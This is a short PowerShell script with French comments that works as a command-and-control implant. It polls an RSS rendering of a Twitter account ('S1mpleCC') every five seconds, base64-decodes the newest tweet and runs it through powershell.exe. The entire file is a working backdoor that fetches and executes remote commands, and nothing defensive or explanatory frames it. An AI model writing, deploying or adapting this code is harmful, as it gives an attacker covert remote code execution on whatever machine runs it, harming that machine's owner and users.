function Get-LastCmd {
    # On utilise un générateur de feed RSS pour simplifier le parsing du flux Twitter
    $Html = (Invoke-WebRequest -Uri "https://twitrss.me/twitter_user_to_rss/?user=S1mpleCC" -UseBasicParsing).Content

    # On travaille la string pour garder seulement le payload
    $LastCMD = ([xml]$Html).GetElementsByTagName("item") | 
                    Select-Object title, pubDate, @{l="date";e={$_.pubDate | Get-Date}} |
                    Sort-Object -Property date -Descending | 
                    Select-Object -First 1

    return $LastCMD.title
}

$PrevCmd = ""

while ($true) {
    $MyCmd = Get-LastCmd
    if ($MyCmd -ne $PrevCmd) {
        $PrevCmd = $MyCmd
        $DecCmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($MyCmd))
        Start-Process "powershell.exe" -ArgumentList "-Command `"$($DecCmd)`"" -NoNewWindow
    }
    else {
        Start-Sleep -Seconds 5
    }
}